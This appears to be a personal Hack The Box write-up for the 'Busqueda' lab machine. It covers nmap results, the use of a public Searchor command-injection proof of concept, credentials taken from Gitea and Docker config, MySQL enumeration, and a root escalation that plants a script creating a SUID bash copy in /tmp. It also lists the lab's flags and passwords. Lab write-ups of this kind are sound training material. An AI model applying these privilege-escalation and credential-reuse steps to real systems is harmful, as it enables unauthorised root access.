+++
title = "HTB - Busqueda"
date = 2024-11-04
+++


```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 21:10 EST
Nmap scan report for 10.10.11.208
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.02 seconds

```

### Enumeration

##### 80
Searchor 2.4.0
Flask (Werkzeug 2.1.2, Python 3.10.6)
Versions look vulnerable... POC on github -> https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.git

POC works, shell obtained
USER: 3e5bce2026db8f9d6fd5a2da7a876dcf
### Privilege Escalation

We can see via `ls -la` that there's a gitea directory, and parsing through the config, we get credentials for `cody`
`jh1usoih2bkjaspwe92`
This doesn't work for SSH, but it does for the website, and for authenticating with `sudo`
We see that we can run service scripts from the `opt` directory this way, and cycling through those, we find a SQL database instance running. 0xdf talks about formatting the command to dump the database with the `docker-inspect` command.

`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .`

This essentially queries the database for everything in the gitea database and pipes it to jq for pretty formatting.
We find credentials - `gitea:yuiu1hoiu4i5ho1uh`

`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .`

And the IP of the DB - `172.19.0.3`

We can then use `mysql` to connect. Syntax is really weird here...
`mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea`

Show the DB `show databases;`
Show Tables `show TABLES;`
Show content in `user` - `describe user;`
Get what we need, `SELECT name,email,passwd from user;`

Uhh. alright. Just go to gitea.searcher.htb webpage you saw referenced earlier. Recycle creds for admin.
Private scripts repository with checkup script. We can put whatever we want here and it will run as root if we start system-checkup.py full-checkup in the same dir.

U shoulda known this, but the highlighted green dirs are writeable to u.
Go there and run the following:
`echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/li0t\nchmod 4777 /tmp/li0t' > full-checkup.sh`
make it executable `chmod +x full-checkup.sh`

Remember sudo -l? we can run that command here now 
`sudo python3 /opt/scripts/system-checkup.py full-checkup`

We should be able to go to that directory and drop into our shell `/tmp/li0t -p`
do this quickly, theres a cleanup script somewhere

root: 94c7cefd8aa28d5f41c9faee2543f9d8

reference 0xdf when writing writeup.




